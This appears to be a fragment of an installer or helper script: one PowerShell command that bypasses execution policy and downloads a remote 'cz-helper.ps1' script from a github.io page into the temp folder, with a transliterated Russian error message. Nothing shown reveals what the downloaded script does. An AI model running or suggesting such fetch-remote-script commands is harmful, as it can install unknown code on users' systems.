...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=3072; try { Invoke-WebRequest 'https://kalinina249-blip.github.io/kiz-scanner/cz-helper.ps1' -OutFile \"$env:TEMP\cz-helper.ps1\" -UseBasicParsing -TimeoutSec 30 } catch { Write-Host 'Ne udalos skachat (net interneta?)' -ForegroundColor Red }"
